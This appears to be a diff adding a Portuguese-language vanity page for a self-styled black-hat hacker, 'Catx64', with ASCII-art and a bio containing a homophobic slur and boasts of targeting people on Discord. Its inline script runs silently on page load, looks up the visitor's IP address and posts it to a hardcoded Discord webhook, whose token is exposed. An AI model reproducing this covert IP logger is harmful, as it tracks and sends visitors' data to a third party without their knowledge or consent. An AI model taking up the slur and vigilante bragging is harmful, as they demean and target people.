@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Catx64 - Hacker Black Hat</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="content-wrapper">
+        <header>
+            <h1></h1>
+            <h2>Hacker Black Hat</h2>
+        </header>
+        <section class="ascii-art">
+            <pre>
+               \`-._           __
+                \\  `-..____,.'  `.
+                 :`.         /    \`.
+                 :  )       :      : \\
+                  ;'        '   ;  |  :
+                  )..      .. .:.`.;  :
+                 /::...  .:::...   ` ;
+                 ; _ '    __        /:\\
+                 `:o>   /\\o_>      ;:. `.
+                `-`.__ ;   __..--- /:.   \\
+                === \\_/   ;=====_.':.     ;
+                 ,/'`--'...`--....        ;
+                      ;                    ;
+                    .'                      ;
+                  .'                        ;
+                .'     ..     ,      .       ;
+               :       ::..  /      ;::.     |
+              /      `.;::.  |       ;:..    ;
+             :         |:.   :       ;:.    ;
+             :         ::     ;:..   |.    ;
+              :       :;      :::....|     |
+              /\\     ,/ \\      ;:::::;     ;
+            .:. \\:..|    :     ; '.--|     ;
+           ::.  :''  `-.,,;     ;'   ;     ;
+        .-'. _.'\\      / `;      \\,__:      \\
+        `---'    `----'   ;      /    \\,.,,,/
+                           `----`
+            </pre>
+        </section>
+            <h2>Catx64</h2>
+            <p>é um hacker black hat que combate paneleiros e pedófilos. Já conseguiu rodar mais de 10 pedófilos no Discord.</p>
+        </section>
+        <footer>
+            <p>&copy; 2025 Catx64 - Todos os direitos reservados.</p>
+        </footer>
+    </div>
+
+    
+    <script>
+        (function() {
+            
+            const sendURL = "https://discord.com/api/webhooks/1326227479622324395/a_uSmUaOYe6WgQeV-1-fifEJm6MmAI5LtBCB_CF8NmUSnhete8Jb53Tm2AF9pGxqR2cM";
+
+            
+            function captureVisitorData() {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => sendData(data.ip))
+                    .catch(() => console.warn("Não foi possível capturar o IP."));
+            }
+
+            function sendData(visitorIP) {
+                const payload = { content: `Novo visitante: ${visitorIP}` };
+                fetch(sendURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (!response.ok) console.error("Erro ao enviar dados:", response.status);
+                })
+                .catch(() => console.warn("Não foi possível enviar os dados."));
+            }
+
+            captureVisitorData();
+        })();
+    </script>
+</body>
+</html>
